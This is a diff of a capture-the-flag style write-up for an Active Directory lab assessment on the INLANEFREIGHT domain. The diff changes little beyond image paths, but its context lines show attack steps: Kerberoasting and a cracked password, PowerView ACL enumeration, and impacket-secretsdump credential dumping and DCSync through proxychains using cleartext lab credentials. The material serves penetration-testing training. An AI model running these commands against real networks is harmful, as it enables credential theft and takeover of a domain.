@@ -10,7 +10,7 @@ Apply what you learned in this module to compromise the domain and answer the qu
 
 **Submit the contents of the flag.txt file on the administrator Desktop of the web server**
 
-<figure><img src="../../../.gitbook/assets/image (49).png" alt=""><figcaption><p>got a revshell and obtained the flag.</p></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (49) (2).png" alt=""><figcaption><p>got a revshell and obtained the flag.</p></figcaption></figure>
 
 **Kerberoast an account with the SPN MSSQLSvc/SQL01.inlanefreight.local:1433 and submit the account name as your answer**
 
@@ -20,7 +20,7 @@ Apply what you learned in this module to compromise the domain and answer the qu
 
 **Crack the account's password. Submit the cleartext value.**
 
-<figure><img src="../../../.gitbook/assets/image (9).png" alt=""><figcaption><p>lucky7</p></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (9) (1).png" alt=""><figcaption><p>lucky7</p></figcaption></figure>
 
 **Submit the contents of the flag.txt file on the Administrator desktop on MS01**
 
@@ -30,7 +30,7 @@ we have to know what IP does MS01 has&#x20;
 Resolve-IPAddress -ComputerName MS01
 ```
 
-<figure><img src="../../../.gitbook/assets/image (20).png" alt=""><figcaption><p>172.16.6.50</p></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (20) (3).png" alt=""><figcaption><p>172.16.6.50</p></figcaption></figure>
 
 When SMB scan was performed, there were ADMIN$ and C$ shares, which were read and writable.
 
@@ -101,7 +101,7 @@ Note that RDP is also available for this host.
 
 **Find cleartext credentials for another domain user. Submit the username as your answer.**
 
-<figure><img src="../../../.gitbook/assets/image (16) (2).png" alt=""><figcaption><p>nothing useful</p></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (16).png" alt=""><figcaption><p>nothing useful</p></figcaption></figure>
 
 ```
 proxychains impacket-secretsdump INLANEFREIGHT.LOCAL/svc_sql:lucky7@172.16.6.50 -outputfile inlanefreight_hashes 
@@ -165,9 +165,9 @@ $sid = Convert-NameToSid tpetty
 Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid} 
 ```
 
-<figure><img src="../../../.gitbook/assets/image (38).png" alt=""><figcaption><p>DS-Replication-Get-Changes-All</p></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (38) (1).png" alt=""><figcaption><p>DS-Replication-Get-Changes-All</p></figcaption></figure>
 
-<figure><img src="../../../.gitbook/assets/image (10).png" alt=""><figcaption><p>DS-Replication-Get-Changes-In-Filtered-Set</p></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (10) (1).png" alt=""><figcaption><p>DS-Replication-Get-Changes-In-Filtered-Set</p></figcaption></figure>
 
 
 
@@ -177,7 +177,7 @@ DCSync
 
 First we have to know what IP is the DC by using the following command.
 
-<figure><img src="../../../.gitbook/assets/image (7) (1).png" alt=""><figcaption><p>172.16.6.3</p></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (7) (3).png" alt=""><figcaption><p>172.16.6.3</p></figcaption></figure>
 
 ```
 proxychains impacket-secretsdump -just-dc INLANEFREIGHT/tpetty:'Sup3rS3cur3D0m@inU2eR'@172.16.6.3 -outputfile ilf_dcsync
